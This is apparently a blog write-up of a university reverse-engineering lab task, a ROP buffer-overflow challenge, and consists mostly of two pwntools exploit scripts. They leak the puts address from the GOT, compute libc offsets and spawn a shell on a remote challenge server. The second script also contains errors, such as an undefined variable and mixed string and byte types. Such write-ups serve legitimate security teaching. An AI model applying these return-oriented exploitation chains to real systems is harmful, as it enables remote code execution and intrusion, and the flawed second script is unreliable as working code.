---
layout: post
title:  UNIBUC_RE_lab_6_task_4
image: /assets/img/UNIBUC_RE.jpg
date:   2022-09-01 16:39:01
tags:
- pwn
description: ROP challenge with buffer overflow
categories:
- UNIBUC RE
---

ROP challenge with buffer overflow

![](/assets/img/2022-09-02-14-10-16.png)

The difference between the last one and this one is that you have to get puts address by calling puts with got puts address first.

```

from pwn import *

from ctypes import *
e = ELF('./task04')
pop_rdi=0x000000000040127b
bin_sh=0x40302a
print(hex(e.symbols['puts']))
io=remote('45.76.91.112',10064)

#io = process("./task04",env={"LD_PRELOAD" : "./libc.so"})
print(hex(e.got['puts']))
io.recvuntil("name")
#gdb.attach(io,'break *0x40120E   ')
io.sendline(136*b'x'+p64(pop_rdi)+p64(e.got['puts'])+p64(e.symbols['puts'])+p64(e.symbols['main']))
address=io.recvline()
address=io.recvline()
print([i for i in address])
puts_address=u64(address[:-1]+(8-len(address)+1)*b'\x00')
system_address=puts_address-0x2A300
print(hex(puts_address))
print('puts end ----')



io.sendline( b'a'*136+p64(pop_rdi)+p64(bin_sh)+p64(system_address))

io.interactive()

```

You also can do it while calling main only once:
 the breakdown of io sendline arguments is: first get to return address with a(0x61)because it's easy to follow
then put puts address on the stack using pop rdi return and then call puts to output that address
then put on the stack in rdi %s and in rsi some address and put some junk as there is no rop with only pop rsi.
Call  scanf one address, then call an address to see if scanf finishes without errors
```

# puts address offset 6f690
# offset of 0x4526a
ret=p64(0x00401016) # this is used only to allign the stack
scanf=p64(0x401050) #scanf address
s_format_string=p64(0x403072) #this is the format string
pop_rsi=p64(0x00401279) # we use this to add a second argument for functions it has 1 aditional junk register to fill
puts=p64(0x401030) #this is puts when we want to call it
puts_addr=p64(0x404018)# this is what to push on stack in order to print puts address
filling=p64(0x69696969) #random string chosen completely randomly by dice trow (very strange dice)
scanf_where=p64(0x404059)#address we want to inject code into and later use as stack
pop_rdi=p64(0x0040127b)#  this puts first argument on stack 
pop_rsp=p64(0x00401275)#pop r13 pop r14 pop r15 this makes sure we have a stack 
bin_bash=p64(0x40302a)#bin_bash string


io.sendline( 'a'*136+pop_rdi+puts_addr+puts+pop_rsi+scanf_where+filling+pop_rdi+s_format_string+ret+scanf+pop_rsp+ scanf_where)
libcoffset_puts=0x6f690
libcoffset_of_execv=0x4526a
address=io.recvline()
address=io.recvline()
address=struct.unpack("<q",address[:-1]+(8-len(address)+1)*'\x00')[0]
calculatedspot=p64(address-libcoffset+libcoffset_of_execv)
print('address is '+hex(address))
io.sendline(filling*2+bin_bash+calculatedspot)
io.interactive()


```